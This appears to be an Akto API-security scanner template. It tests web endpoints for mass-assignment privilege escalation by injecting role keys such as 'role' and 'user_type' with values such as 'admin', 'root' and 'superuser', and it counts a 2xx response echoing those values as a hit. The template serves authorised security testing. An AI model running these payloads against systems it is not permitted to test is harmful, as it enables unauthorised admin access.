id: create_admin_user
info:
  name: Create admin user via mass assignment
  author: akto
  severity: high

requests:
  - method: "{{Method}}"
    path:
      - "{{BaseURL}}"
    body: "{{Body}}"

    payloads:
      role_key:
        - "role"
        - "Role"
        - "user_role"
        - "user_type"
      role_value:
        - "admin"
        - "administrator"
        - "superuser"
        - "super"
        - "root"
        - "god"
        - "sysadmin"
        - "sysop"
        - "moderator"
        - "mod"
    attack: clusterbomb
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 2xx
      - type: word
        part: body
        words:
          - "admin"
          - "administrator"
          - "superuser"
          - "super"
          - "root"
          - "god"
          - "sysadmin"
          - "sysop"
          - "moderator"
          - "mod"
        condition: or